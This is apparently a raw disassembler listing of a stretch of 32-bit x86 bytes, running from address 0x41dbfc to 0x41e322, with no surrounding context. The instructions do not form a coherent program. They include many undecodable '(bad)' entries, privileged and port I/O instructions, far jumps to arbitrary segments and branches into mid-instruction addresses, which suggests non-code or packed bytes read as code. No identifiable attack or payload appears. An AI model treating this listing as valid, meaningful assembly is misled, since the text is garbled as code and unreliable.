  41dbfc:	and    al,0xb9
  41dbfe:	pop    ebx
  41dbff:	in     eax,dx
  41dc00:	jecxz  0x41dbf2
  41dc02:	dec    ebx
  41dc03:	clc    
  41dc04:	adc    eax,0xa3881ced
  41dc09:	test   al,0x9
  41dc0b:	xor    BYTE PTR [ecx-0xe],bl
  41dc0e:	or     BYTE PTR [esi-0x62],cl
  41dc11:	clc    
  41dc12:	add    al,0xb2
  41dc14:	add    ebp,esp
  41dc16:	in     al,dx
  41dc17:	push   ss
  41dc18:	mov    bh,0x55
  41dc1a:	shl    edi,1
  41dc1c:	cwde   
  41dc1d:	sbb    ecx,ebp
  41dc1f:	ss iret 
  41dc21:	xchg   DWORD PTR [ebx],edx
  41dc23:	iret   
  41dc24:	jns    0x41dc10
  41dc26:	sub    al,0x7d
  41dc28:	arpl   WORD PTR [ecx+edx*2+0x3979a186],bx
  41dc2f:	or     DWORD PTR [edi],ebx
  41dc31:	jg     0x41dc16
  41dc33:	jo     0x41dc4f
  41dc35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc36:	fimul  DWORD PTR [eax-0x3]
  41dc39:	inc    edx
  41dc3a:	in     al,dx
  41dc3b:	out    0x12,al
  41dc3d:	pop    ebx
  41dc3e:	outs   dx,BYTE PTR ds:[esi]
  41dc3f:	jecxz  0x41dbd5
  41dc41:	mov    esi,0xa238feaf
  41dc46:	xor    DWORD PTR [ebx-0x4f],esi
  41dc49:	sbb    BYTE PTR [ebx+0x41],0x3d
  41dc4d:	js     0x41dc16
  41dc4f:	inc    esi
  41dc50:	pop    eax
  41dc51:	mov    al,ds:0x91fc9c3e
  41dc56:	(bad)  
  41dc57:	fdiv   DWORD PTR [esi+ebx*4+0x28d1457d]
  41dc5e:	das    
  41dc5f:	(bad)  
  41dc60:	xchg   esi,eax
  41dc61:	out    0xa0,al
  41dc63:	into   
  41dc64:	pop    esp
  41dc65:	dec    esp
  41dc66:	pop    edx
  41dc67:	mov    esi,ss
  41dc69:	and    eax,0x3055f417
  41dc6e:	sbb    eax,0x7c646007
  41dc73:	sti    
  41dc74:	xor    eax,0xb229050a
  41dc79:	leave  
  41dc7a:	or     al,0x1a
  41dc7c:	xor    ecx,DWORD PTR [esi+0x3c]
  41dc7f:	loope  0x41dcf4
  41dc81:	pop    ss
  41dc82:	es in  eax,dx
  41dc84:	(bad)  
  41dc85:	mov    eax,0x39c91b1b
  41dc8a:	lea    ecx,[edx]
  41dc8c:	out    dx,al
  41dc8d:	add    ebp,edi
  41dc8f:	adc    DWORD PTR [ebx+0x2c],edi
  41dc92:	sbb    eax,0x16f59254
  41dc97:	jmp    0x41dc75
  41dc99:	dec    eax
  41dc9a:	mov    ds:0x7896720,al
  41dc9f:	push   esi
  41dca0:	dec    ebp
  41dca1:	pop    ebp
  41dca2:	setp   BYTE PTR ds:0x1cdcb58e
  41dca9:	aad    0xba
  41dcab:	ins    DWORD PTR es:[edi],dx
  41dcac:	lds    esp,FWORD PTR [ebx-0x6b623e75]
  41dcb2:	add    DWORD PTR [ebp+0xf23ac01],0x46
  41dcb9:	lds    edi,FWORD PTR [ebx+0x3f5ce5c8]
  41dcbf:	ss dec ebx
  41dcc1:	outs   dx,BYTE PTR ds:[esi]
  41dcc2:	fild   DWORD PTR [ebx-0x2f3dfa9f]
  41dcc8:	rcr    DWORD PTR [eax],cl
  41dcca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dccb:	fistp  WORD PTR [ebx+0x6e8aad3b]
  41dcd1:	mov    ds:0x3cd3e482,al
  41dcd6:	push   0x1d7f6db6
  41dcdb:	add    cl,ch
  41dcdd:	test   eax,0x2eed367d
  41dce2:	(bad)  
  41dce3:	lods   eax,DWORD PTR ds:[esi]
  41dce4:	or     edx,eax
  41dce6:	(bad)  
  41dce7:	scas   al,BYTE PTR es:[edi]
  41dce8:	adc    edi,DWORD PTR [ebx-0x6b]
  41dceb:	and    BYTE PTR [ebp-0x25],ah
  41dcee:	lahf   
  41dcef:	add    cl,dl
  41dcf1:	xlat   BYTE PTR ds:[ebx]
  41dcf2:	mov    ecx,0x62c862cf
  41dcf7:	lahf   
  41dcf8:	fmul   DWORD PTR ds:0x61491281
  41dcfe:	dec    edi
  41dcff:	mov    esp,ebp
  41dd01:	jmp    0x99d3:0xea898ed2
  41dd08:	add    DWORD PTR [esi],ebx
  41dd0a:	xor    al,0x4
  41dd0c:	inc    edi
  41dd0d:	jmp    0x41dcd3
  41dd0f:	inc    eax
  41dd10:	push   esp
  41dd11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd12:	leave  
  41dd13:	das    
  41dd14:	add    al,ch
  41dd16:	push   ebx
  41dd17:	ds mov dh,0x36
  41dd1a:	push   cs
  41dd1b:	xor    al,0x3
  41dd1d:	aad    0xad
  41dd1f:	push   edi
  41dd20:	fwait
  41dd21:	jae    0x41dd15
  41dd23:	iret   
  41dd24:	jo     0x41dcb1
  41dd26:	jecxz  0x41dcd9
  41dd28:	xchg   ecx,eax
  41dd29:	or     al,0xc9
  41dd2b:	aad    0x4c
  41dd2d:	mov    cl,0x42
  41dd2f:	rcl    DWORD PTR [edx+0x6f],0x9b
  41dd33:	rcr    BYTE PTR [esi-0x270b0d3d],0xb7
  41dd3a:	mov    edx,cr1
  41dd3d:	fsub   QWORD PTR [edi+0x39]
  41dd40:	fiadd  DWORD PTR [edx+0x5e]
  41dd43:	mov    eax,ds:0xf8fd877f
  41dd48:	out    0x54,al
  41dd4a:	ja     0x41dd6c
  41dd4c:	pusha  
  41dd4d:	pop    ss
  41dd4e:	psubw  mm4,QWORD PTR [eax-0x4c4deb73]
  41dd55:	jmp    0xd709:0x14a11a98
  41dd5c:	icebp  
  41dd5d:	das    
  41dd5e:	pop    ebp
  41dd5f:	xchg   DWORD PTR [ebx],edx
  41dd61:	jnp    0x41ddde
  41dd63:	nop
  41dd64:	jns    0x41dd28
  41dd66:	xor    eax,0xfed4dfed
  41dd6b:	or     ebp,DWORD PTR [eax+0x4f]
  41dd6e:	jb     0x41ddad
  41dd70:	enter  0x4f5a,0xc4
  41dd74:	mov    DWORD PTR [edi-0x358370d7],eax
  41dd7a:	pushf  
  41dd7b:	stos   DWORD PTR es:[edi],eax
  41dd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd7d:	imul   edi,DWORD PTR [edx-0x56],0xc
  41dd81:	pop    edi
  41dd82:	pop    ds
  41dd83:	sub    dh,BYTE PTR [esi]
  41dd85:	(bad)  
  41dd86:	loope  0x41dd8c
  41dd88:	adc    bh,bl
  41dd8a:	adc    eax,0x67eaee9
  41dd8f:	imul   esp,DWORD PTR [ecx-0x3d],0x17
  41dd93:	repnz adc eax,0xc83e9973
  41dd99:	lea    ecx,[edi+0x3f3ec0b9]
  41dd9f:	adc    cl,cl
  41dda1:	aas    
  41dda2:	and    edx,DWORD PTR ds:0x9f6428e8
  41dda8:	mov    edx,0xfab66402
  41ddad:	inc    ebx
  41ddae:	je     0x41de27
  41ddb0:	pop    ebx
  41ddb1:	js     0x41dd4c
  41ddb3:	js     0x41de1c
  41ddb5:	out    0xc7,al
  41ddb7:	mov    ebx,0xe76b84b6
  41ddbc:	push   ecx
  41ddbd:	xchg   edi,eax
  41ddbe:	xchg   esp,eax
  41ddbf:	int3   
  41ddc0:	gs aam 0xa1
  41ddc3:	fnsave [ecx+eiz*4-0x26]
  41ddc7:	dec    esp
  41ddc8:	in     al,dx
  41ddc9:	mov    BYTE PTR [ebx+0x7f],dh
  41ddcc:	pop    ecx
  41ddcd:	xchg   esi,eax
  41ddce:	pop    edx
  41ddcf:	sub    al,0x3f
  41ddd1:	push   0x71e44886
  41ddd6:	and    eax,0xa896fbbe
  41dddb:	stos   BYTE PTR es:[edi],al
  41dddc:	xchg   ebx,eax
  41dddd:	lea    esi,[edx-0x68d38501]
  41dde3:	xor    BYTE PTR [ecx+0x7d],0xbe
  41dde7:	test   al,0xfb
  41dde9:	mov    ebp,0xa317d93b
  41ddee:	xor    al,0xed
  41ddf0:	repz std 
  41ddf2:	pushf  
  41ddf3:	mov    ds:0x46070904,al
  41ddf8:	pop    ebx
  41ddf9:	ja     0x41de26
  41ddfb:	cmp    BYTE PTR [esi],bl
  41ddfd:	inc    esp
  41ddfe:	xchg   edi,eax
  41ddff:	mov    ch,0x15
  41de01:	rcl    ebx,0xfa
  41de04:	mov    ecx,0x5f57fb78
  41de09:	fcomp  st(3)
  41de0b:	xor    ebx,edx
  41de0d:	scas   eax,DWORD PTR es:[edi]
  41de0e:	(bad)  
  41de10:	mov    ds:0x61126449,eax
  41de15:	pusha  
  41de16:	retf   
  41de17:	std    
  41de18:	popa   
  41de19:	bound  ecx,QWORD PTR [edi-0x25]
  41de1c:	push   0x3efacbf2
  41de21:	cmp    cl,BYTE PTR [edi+0x6e3b11cc]
  41de27:	int    0xaa
  41de29:	ret    0x87a4
  41de2c:	fisubr DWORD PTR [ecx]
  41de2e:	sbb    BYTE PTR [ecx],ah
  41de30:	test   al,0xe6
  41de32:	sahf   
  41de33:	add    edi,DWORD PTR [esi]
  41de35:	sbb    esi,DWORD PTR [esi+0x57a12d6d]
  41de3b:	xchg   ebx,eax
  41de3c:	shr    DWORD PTR [esi+0x28],1
  41de3f:	xchg   ebx,eax
  41de40:	dec    esp
  41de41:	or     eax,0x847048f4
  41de46:	sub    dl,BYTE PTR ss:[edi+0x6a]
  41de4a:	daa    
  41de4b:	jbe    0x41de4e
  41de4d:	(bad)  
  41de4e:	add    eax,0x6f19f645
  41de53:	and    bl,bl
  41de55:	ins    DWORD PTR es:[edi],dx
  41de56:	and    DWORD PTR ds:0x5a94da2b,ebp
  41de5c:	lods   al,BYTE PTR ds:[esi]
  41de5d:	sub    DWORD PTR [ecx],esp
  41de5f:	dec    ebp
  41de60:	clc    
  41de61:	push   edx
  41de62:	jmp    0xde6ff7b1
  41de67:	pushf  
  41de68:	adc    DWORD PTR [esi+0x41b5e624],0x7e
  41de6f:	xor    BYTE PTR [ecx],ch
  41de71:	pop    edx
  41de72:	jle    0x41ded0
  41de74:	dec    ecx
  41de75:	in     al,dx
  41de76:	add    BYTE PTR [eax-0x55],dh
  41de79:	js     0x41de51
  41de7b:	sbb    BYTE PTR [ecx],0xa6
  41de7e:	or     eax,0xbaf05222
  41de83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de84:	mov    BYTE PTR [edx+0x4a],dl
  41de87:	ret    
  41de88:	xchg   esi,eax
  41de89:	retf   
  41de8a:	fwait
  41de8b:	xchg   ecx,eax
  41de8c:	push   0xe9d2d2b9
  41de91:	shl    ah,1
  41de93:	mov    ds:0xd2491e84,eax
  41de98:	scas   al,BYTE PTR es:[edi]
  41de99:	dec    edi
  41de9a:	mov    ecx,0xc369d42d
  41de9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dea0:	jo     0x41df18
  41dea2:	mov    edi,0x205a3d5e
  41dea7:	pop    edx
  41dea8:	test   al,0xf7
  41deaa:	mov    ebx,0x45c04cb7
  41deaf:	aas    
  41deb0:	lahf   
  41deb1:	retf   0x21ab
  41deb4:	int3   
  41deb5:	clc    
  41deb6:	es ret 
  41deb8:	xchg   ecx,eax
  41deb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deba:	hlt    
  41debb:	test   al,0xcc
  41debd:	inc    ecx
  41debe:	or     BYTE PTR [eax+ebx*1+0x16],al
  41dec2:	and    eax,0x9ac95260
  41dec7:	call   0xc4607ee9
  41decc:	or     ch,bl
  41dece:	ds cli 
  41ded0:	call   0xb313544e
  41ded5:	cmp    BYTE PTR [ecx+0x48],dh
  41ded8:	mov    eax,?
  41deda:	mov    dl,0x72
  41dedc:	jno    0x41dec7
  41dede:	imul   ecx,ebx,0xba6f54a2
  41dee4:	ins    BYTE PTR es:[edi],dx
  41dee5:	xchg   BYTE PTR [eax],al
  41dee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee8:	cs inc ecx
  41deea:	loop   0x41dee1
  41deec:	into   
  41deed:	or     dh,BYTE PTR [esp+eax*2]
  41def0:	rol    DWORD PTR [eax],cl
  41def2:	or     bl,BYTE PTR [edi]
  41def4:	push   ebp
  41def5:	sub    ah,bl
  41def7:	dec    ebx
  41def8:	xchg   edi,eax
  41def9:	jne    0x41df20
  41defb:	and    DWORD PTR [ecx+0x25],ebp
  41defe:	adc    DWORD PTR [ecx+0x7],esp
  41df01:	mov    esp,0x372f8cae
  41df07:	xlat   BYTE PTR ds:[ebx]
  41df08:	aas    
  41df09:	mov    al,0xe7
  41df0b:	out    dx,eax
  41df0c:	cmp    al,0xcb
  41df0e:	xor    al,0x2e
  41df10:	sub    eax,0xa83069ad
  41df15:	arpl   WORD PTR [eax+0x42],si
  41df18:	pop    ebp
  41df19:	cmp    DWORD PTR [edx],ecx
  41df1b:	push   edi
  41df1c:	mov    esi,0x678a3f5c
  41df21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df23:	jmp    FWORD PTR [esi+0x2dfc321]
  41df29:	mov    bh,0x1d
  41df2b:	mov    dh,BYTE PTR [edx]
  41df2d:	aaa    
  41df2e:	cdq    
  41df2f:	dec    di
  41df31:	lock fisub DWORD PTR [eax+0x67bf52c7]
  41df38:	popf   
  41df39:	sahf   
  41df3a:	xor    BYTE PTR [eax-0x70cab389],dh
  41df40:	aad    0x16
  41df42:	sub    eax,0xaa3eafd7
  41df47:	out    dx,al
  41df48:	cvtps2pd xmm3,QWORD PTR [edi-0x7d564a2e]
  41df4f:	sahf   
  41df50:	in     al,0x84
  41df52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df53:	adc    dl,BYTE PTR [edx]
  41df55:	jns    0x41def5
  41df57:	push   0xfe394da4
  41df5c:	push   edx
  41df5d:	addr16 pop esp
  41df5f:	sbb    edi,esp
  41df61:	jl     0x41dfc6
  41df63:	push   eax
  41df64:	xchg   edx,eax
  41df65:	and    al,bl
  41df67:	outs   dx,DWORD PTR ds:[esi]
  41df68:	jnp    0x41df6a
  41df6a:	pop    ebp
  41df6b:	test   DWORD PTR [esi+0x3a],ebp
  41df6e:	fistp  WORD PTR [eax]
  41df70:	(bad)  
  41df71:	xor    edx,DWORD PTR [ebx]
  41df73:	and    bl,BYTE PTR [ebx+0x52]
  41df76:	mov    dh,0x40
  41df78:	scas   eax,DWORD PTR es:[edi]
  41df79:	stc    
  41df7a:	xchg   ebx,eax
  41df7b:	cmp    eax,DWORD PTR [edi-0xc]
  41df7e:	xchg   edi,eax
  41df7f:	pop    esp
  41df80:	loope  0x41dff6
  41df82:	shr    cl,0xee
  41df85:	or     ebp,DWORD PTR [esi-0x3b]
  41df88:	arpl   di,bx
  41df8a:	arpl   cx,di
  41df8c:	pop    ds
  41df8d:	xchg   ecx,eax
  41df8e:	xchg   ebp,eax
  41df8f:	nop
  41df90:	xchg   esi,eax
  41df91:	or     al,0x6e
  41df93:	cmp    ebp,DWORD PTR [edi+0x6568367f]
  41df99:	in     eax,dx
  41df9a:	adc    eax,0xe97cc2bd
  41df9f:	call   0xf80ed5ad
  41dfa4:	mov    bl,0x6e
  41dfa6:	or     DWORD PTR [edi],esp
  41dfa8:	push   ecx
  41dfa9:	jb     0x41df80
  41dfab:	ins    BYTE PTR es:[edi],dx
  41dfac:	and    esp,DWORD PTR [esp+edx*4]
  41dfaf:	mov    esp,0xb2f05ca
  41dfb4:	rcl    DWORD PTR [eax-0x743fb5e9],0xe8
  41dfbb:	and    eax,0x8218b768
  41dfc0:	mov    edi,0x84b23377
  41dfc5:	lahf   
  41dfc6:	stos   DWORD PTR es:[edi],eax
  41dfc7:	sbb    eax,0xece1803c
  41dfcc:	retf   
  41dfcd:	sbb    al,0x30
  41dfcf:	dec    eax
  41dfd0:	and    al,0xc0
  41dfd2:	ficom  WORD PTR [ecx+0x2d]
  41dfd5:	stos   BYTE PTR es:[edi],al
  41dfd6:	lds    eax,FWORD PTR [edi+0x54]
  41dfd9:	mov    BYTE PTR [edi],cl
  41dfdb:	scas   al,BYTE PTR es:[edi]
  41dfdc:	popa   
  41dfdd:	xchg   ebp,eax
  41dfde:	or     al,0xcc
  41dfe0:	dec    esi
  41dfe1:	mov    al,ds:0x4db827cc
  41dfe6:	lods   al,BYTE PTR ds:[esi]
  41dfe7:	fdivrp st(6),st
  41dfe9:	cmp    BYTE PTR [ebx+esi*4],0x94
  41dfed:	test   DWORD PTR [edi+0x14],ebx
  41dff0:	push   ecx
  41dff1:	cmc    
  41dff2:	sub    ecx,DWORD PTR ds:0xb7d49f04
  41dff8:	pop    ecx
  41dff9:	dec    ebx
  41dffa:	test   DWORD PTR [edx],0xa838636e
  41e000:	xchg   ebx,eax
  41e001:	loopne 0x41e009
  41e003:	ficomp DWORD PTR [edi+0x7029ba18]
  41e009:	(bad)  
  41e00a:	pop    esi
  41e00b:	mov    ebp,0x7b46a290
  41e010:	adc    al,0xfe
  41e012:	dec    esp
  41e013:	ds cli 
  41e015:	and    eax,0x9599d9e8
  41e01a:	jmp    0xe774:0xfe0ddf65
  41e021:	stc    
  41e022:	mov    edi,0x184808f
  41e027:	mov    ecx,0xb7123f15
  41e02c:	dec    edx
  41e02d:	pand   mm1,QWORD PTR [edx+0x1d]
  41e031:	(bad)  
  41e033:	xor    BYTE PTR [eax+0x69],bl
  41e036:	add    eax,0x725994d7
  41e03b:	xor    al,0x12
  41e03d:	iret   
  41e03e:	ss push edi
  41e040:	mov    eax,ds:0xca65c5d5
  41e045:	shl    bh,1
  41e047:	jle    0x41e043
  41e049:	xchg   ebx,eax
  41e04a:	(bad)  
  41e04d:	fisttp WORD PTR [ebp+0x53c73131]
  41e053:	in     eax,dx
  41e054:	adc    al,0x6b
  41e056:	stc    
  41e057:	jbe    0x41dfef
  41e059:	call   0x1f88:0xb4dfda03
  41e060:	ret    0x153c
  41e063:	cli    
  41e064:	and    eax,0xe832cbbb
  41e069:	in     eax,dx
  41e06a:	xchg   ebp,eax
  41e06b:	dec    ebp
  41e06c:	gs mov ch,0x5d
  41e06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e070:	int3   
  41e071:	push   esi
  41e072:	leave  
  41e073:	or     eax,0x9a921347
  41e078:	push   ecx
  41e079:	jnp    0x41e008
  41e07b:	data16 adc dl,BYTE PTR [ebx+0x5c]
  41e07f:	mov    ebp,0x20a4968d
  41e084:	push   ecx
  41e085:	jecxz  0x41e030
  41e087:	adc    al,0x95
  41e089:	cmp    al,0xd
  41e08b:	mov    dl,bh
  41e08d:	push   edx
  41e08e:	aad    0x3
  41e090:	inc    esi
  41e091:	xor    edx,ebx
  41e093:	ds sti 
  41e095:	mov    BYTE PTR [esi+0x7],bh
  41e098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e099:	push   0xffffffd9
  41e09b:	mov    ebx,0xa4cee7f6
  41e0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a1:	push   cs
  41e0a2:	js     0x41e092
  41e0a4:	pop    esi
  41e0a5:	jae    0x41e04a
  41e0a7:	xchg   edx,eax
  41e0a8:	cmp    ah,BYTE PTR [ebp-0x4e5bfd4]
  41e0ae:	dec    edi
  41e0af:	das    
  41e0b0:	es out dx,eax
  41e0b2:	scas   eax,DWORD PTR es:[edi]
  41e0b3:	jl     0x41e0be
  41e0b5:	xor    edx,edi
  41e0b7:	mov    bl,0x5
  41e0b9:	mov    ds:0x97aa1e3c,al
  41e0be:	ss test esp,ecx
  41e0c1:	sti    
  41e0c2:	int3   
  41e0c3:	cmp    bl,0xbf
  41e0c6:	jno    0x41e070
  41e0c8:	repnz cmovno esp,DWORD PTR cs:[esi]
  41e0cd:	xlat   BYTE PTR ds:[bx]
  41e0cf:	imul   eax,DWORD PTR [esi-0x3014eae2],0xe0f3d0
  41e0d9:	inc    ebp
  41e0da:	mov    ch,0x31
  41e0dc:	(bad)  
  41e0df:	push   eax
  41e0e0:	mov    dh,0x4a
  41e0e2:	dec    ecx
  41e0e3:	or     eax,0xa0afb3eb
  41e0e8:	sahf   
  41e0e9:	jge    0x41e0f4
  41e0eb:	push   ds
  41e0ec:	pop    ebx
  41e0ed:	pop    ss
  41e0ee:	pop    eax
  41e0ef:	sbb    al,0xf8
  41e0f1:	xor    bh,BYTE PTR [edi+edi*8+0x1e]
  41e0f5:	iret   
  41e0f6:	out    dx,al
  41e0f7:	out    dx,eax
  41e0f8:	test   eax,0xf654e948
  41e0fd:	adc    DWORD PTR [edx-0x3d5645c9],ecx
  41e103:	repnz sub al,0x93
  41e106:	fld    TBYTE PTR [eax+0x3d]
  41e109:	outs   dx,BYTE PTR ds:[esi]
  41e10a:	rcr    DWORD PTR [ecx],cl
  41e10c:	pusha  
  41e10d:	mov    ebp,0x3ba032ca
  41e112:	pop    edi
  41e113:	ss stos DWORD PTR es:[edi],eax
  41e115:	ror    BYTE PTR [ebp+0x43ddefac],1
  41e11b:	arpl   WORD PTR [ebp+0x14],sp
  41e11e:	dec    edi
  41e11f:	rcr    DWORD PTR [edx],cl
  41e121:	inc    BYTE PTR [eax]
  41e123:	(bad)  
  41e124:	pop    esi
  41e125:	mov    bh,0xb7
  41e127:	mov    bl,0x64
  41e129:	cs xor al,ch
  41e12c:	pop    eax
  41e12d:	cmp    ch,BYTE PTR [ecx]
  41e12f:	mov    ds:0x9525382a,al
  41e134:	push   edx
  41e135:	in     eax,0xd3
  41e137:	mov    WORD PTR [eax],es
  41e139:	push   cs
  41e13a:	(bad)  
  41e13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e13c:	add    DWORD PTR [ebx-0x2f7f5fa3],eax
  41e142:	jbe    0x41e0d5
  41e144:	inc    edi
  41e145:	sub    BYTE PTR [edi+ebx*8-0x507a8a67],ch
  41e14c:	xlat   BYTE PTR ds:[ebx]
  41e14d:	cwde   
  41e14e:	lock add BYTE PTR [edi*2-0x570bec7a],dh
  41e156:	mov    edi,0x8fbe56e1
  41e15b:	imul   ebp,edx,0xffffffdb
  41e15e:	xchg   esp,eax
  41e15f:	fs xchg esp,eax
  41e161:	sub    esi,DWORD PTR [ecx+0x51]
  41e164:	and    edx,DWORD PTR [eax+0x0]
  41e167:	and    DWORD PTR [ecx+0x5a],edi
  41e16a:	addr16 in al,0xb6
  41e16d:	es popf 
  41e16f:	dec    esi
  41e170:	inc    esp
  41e171:	dec    ecx
  41e172:	and    edx,DWORD PTR [esi-0x1e]
  41e175:	in     eax,dx
  41e176:	out    dx,eax
  41e177:	adc    BYTE PTR [edx+0x4f8a5754],dh
  41e17d:	ins    BYTE PTR es:[edi],dx
  41e17e:	sub    al,0x4a
  41e180:	xor    al,BYTE PTR [edi+esi*2+0x6d]
  41e184:	add    al,0xad
  41e186:	pusha  
  41e187:	jg     0x41e138
  41e189:	cmp    eax,0x848d4435
  41e18e:	mov    bl,0xb8
  41e190:	sbb    al,0xee
  41e192:	push   esp
  41e193:	hlt    
  41e194:	mov    al,0x35
  41e196:	(bad)  
  41e197:	cmp    eax,0x789713a8
  41e19c:	cwde   
  41e19d:	xor    eax,0x1d46e6bf
  41e1a2:	jno    0x41e1b5
  41e1a4:	mov    ss,WORD PTR es:[edi+0xd]
  41e1a8:	or     ch,BYTE PTR [edx*8+0x2b6a93fc]
  41e1af:	dec    eax
  41e1b0:	fdiv   DWORD PTR [esi-0x70]
  41e1b3:	jg     0x41e14c
  41e1b5:	shl    bh,0x8e
  41e1b8:	pop    edx
  41e1b9:	cmc    
  41e1ba:	jbe    0x41e194
  41e1bc:	retf   
  41e1bd:	dec    ebp
  41e1be:	sub    eax,0xa1917ae5
  41e1c3:	stos   DWORD PTR es:[edi],eax
  41e1c4:	xor    bl,BYTE PTR [eax+0x79]
  41e1c7:	sbb    esi,edx
  41e1c9:	sti    
  41e1ca:	inc    ebx
  41e1cb:	cmp    esi,ebp
  41e1cd:	inc    esi
  41e1ce:	outs   dx,BYTE PTR ds:[esi]
  41e1cf:	out    0x31,al
  41e1d1:	test   BYTE PTR ds:0xd5ea30a6,dh
  41e1d7:	pop    ecx
  41e1d8:	shr    BYTE PTR [eax+0x66],cl
  41e1db:	mov    ds:0x3e7b295f,al
  41e1e0:	cmp    DWORD PTR ds:[esp+ebx*1+0x36],eax
  41e1e5:	jecxz  0x41e1c4
  41e1e7:	xchg   esp,eax
  41e1e8:	xchg   ebp,eax
  41e1e9:	cwde   
  41e1ea:	jb     0x41e1ce
  41e1ec:	cli    
  41e1ed:	mov    ds:0xbaafa829,eax
  41e1f2:	dec    eax
  41e1f3:	out    dx,eax
  41e1f4:	xchg   edx,eax
  41e1f5:	cmp    al,0x13
  41e1f7:	popf   
  41e1f8:	retf   
  41e1f9:	jl     0x41e1d3
  41e1fb:	inc    ebx
  41e1fc:	and    eax,0x2175d5c5
  41e201:	retf   
  41e202:	xor    BYTE PTR [edx],0xc4
  41e205:	es xor eax,0x1200720f
  41e20b:	(bad)  
  41e20c:	cwde   
  41e20d:	sub    eax,0xe1e603ac
  41e212:	pop    eax
  41e213:	jmp    0x50fd1b26
  41e218:	push   ss
  41e219:	outs   dx,DWORD PTR ds:[esi]
  41e21a:	outs   dx,BYTE PTR ds:[esi]
  41e21b:	outs   dx,DWORD PTR ds:[esi]
  41e21c:	pop    esi
  41e21d:	fwait
  41e21e:	pop    ebp
  41e21f:	mov    eax,0x71466985
  41e224:	xor    BYTE PTR [ebx],0x35
  41e227:	and    al,ch
  41e229:	in     al,0x7d
  41e22b:	xchg   esp,eax
  41e22c:	arpl   WORD PTR [ebx-0x18],dx
  41e22f:	sub    eax,0x7ff2ab36
  41e234:	mov    edi,0xa8a35261
  41e239:	cmc    
  41e23a:	div    BYTE PTR [eax]
  41e23c:	mov    esp,0xcb4b8e6c
  41e241:	add    ebx,esp
  41e243:	scas   al,BYTE PTR es:[edi]
  41e244:	inc    edx
  41e245:	mov    eax,ds:0x2810ce71
  41e24a:	mov    dl,0x5b
  41e24c:	and    eax,0x27802641
  41e251:	push   edx
  41e252:	mov    esi,0xa14ce891
  41e257:	pop    ebx
  41e258:	inc    esp
  41e259:	adc    esi,DWORD PTR [ebx-0x5aa1a51e]
  41e25f:	add    esp,esp
  41e261:	jns    0x41e270
  41e263:	inc    esi
  41e264:	scas   al,BYTE PTR es:[edi]
  41e265:	jbe    0x41e27e
  41e267:	cmc    
  41e268:	jbe    0x41e1f2
  41e26a:	and    al,0x1e
  41e26c:	daa    
  41e26d:	and    ecx,esp
  41e26f:	push   esp
  41e270:	mov    esi,0xf032f2c4
  41e275:	cmp    al,cl
  41e277:	adc    al,0x57
  41e279:	call   FWORD PTR [edi]
  41e27b:	xchg   ecx,eax
  41e27c:	(bad)  
  41e27d:	mov    dl,0x79
  41e27f:	stos   BYTE PTR es:[edi],al
  41e280:	xchg   ebx,eax
  41e281:	inc    edx
  41e282:	not    bh
  41e284:	dec    esi
  41e285:	test   BYTE PTR ss:[edi],ch
  41e288:	popf   
  41e289:	and    bl,BYTE PTR [ebp-0x36]
  41e28c:	popa   
  41e28d:	mov    bl,0x4d
  41e28f:	jl     0x41e2f1
  41e291:	xlat   BYTE PTR ds:[ebx]
  41e292:	shl    ebp,cl
  41e294:	mov    fs,WORD PTR fs:[eax]
  41e297:	outs   dx,DWORD PTR ds:[esi]
  41e298:	aad    0xfa
  41e29a:	leave  
  41e29b:	and    BYTE PTR [edx+0x46],dl
  41e29e:	inc    esi
  41e29f:	fdiv   st,st(3)
  41e2a1:	shl    BYTE PTR [eax+eiz*1+0x23],0x72
  41e2a6:	test   edi,ecx
  41e2a8:	jbe    0x41e2e4
  41e2aa:	push   0xb
  41e2ac:	adc    eax,edx
  41e2ae:	inc    ecx
  41e2af:	repz push edi
  41e2b1:	(bad)  
  41e2b2:	pop    eax
  41e2b3:	jae    0x41e278
  41e2b5:	inc    ebp
  41e2b6:	scas   eax,DWORD PTR es:[edi]
  41e2b7:	popf   
  41e2b8:	mov    edi,0xffd9ed29
  41e2bd:	or     dh,0x7f
  41e2c0:	cli    
  41e2c1:	es test al,0x62
  41e2c4:	push   eax
  41e2c5:	push   es
  41e2c6:	mov    esp,0x85d061e
  41e2cb:	fisttp QWORD PTR [ebx+0x59a3c063]
  41e2d1:	mov    esp,0x17a7f92a
  41e2d6:	dec    eax
  41e2d7:	jnp    0x41e324
  41e2d9:	mov    bh,0x30
  41e2db:	pop    es
  41e2dc:	popf   
  41e2dd:	pop    ds
  41e2de:	mov    WORD PTR [ebx],ds
  41e2e0:	dec    edi
  41e2e1:	aam    0xd0
  41e2e3:	rcl    esi,1
  41e2e5:	sbb    eax,0x4fb97bcb
  41e2ea:	out    dx,eax
  41e2eb:	arpl   WORD PTR [esi+0x20],bx
  41e2ee:	dec    edi
  41e2ef:	pop    esp
  41e2f0:	nop
  41e2f1:	dec    esi
  41e2f2:	jno    0x41e279
  41e2f4:	adc    eax,0xd6d4f1de
  41e2f9:	push   0xffffffec
  41e2fb:	lds    edi,FWORD PTR [ebp+0x21b8656e]
  41e301:	inc    ecx
  41e302:	dec    ebp
  41e303:	sub    ch,bh
  41e305:	out    0xcd,eax
  41e307:	ret    
  41e308:	mov    ch,BYTE PTR [ebp+0x63912019]
  41e30e:	xchg   esi,eax
  41e30f:	cmp    dh,BYTE PTR [edi+0x58608f8b]
  41e315:	or     eax,0x5de9c307
  41e31a:	or     al,0xb9
  41e31c:	int3   
  41e31d:	(bad)  
  41e31e:	xchg   esi,eax
  41e31f:	icebp  
  41e320:	pop    es
  41e321:	xchg   ebp,eax
  41e322:	sub    DWORD PTR [edx-0x47],edi
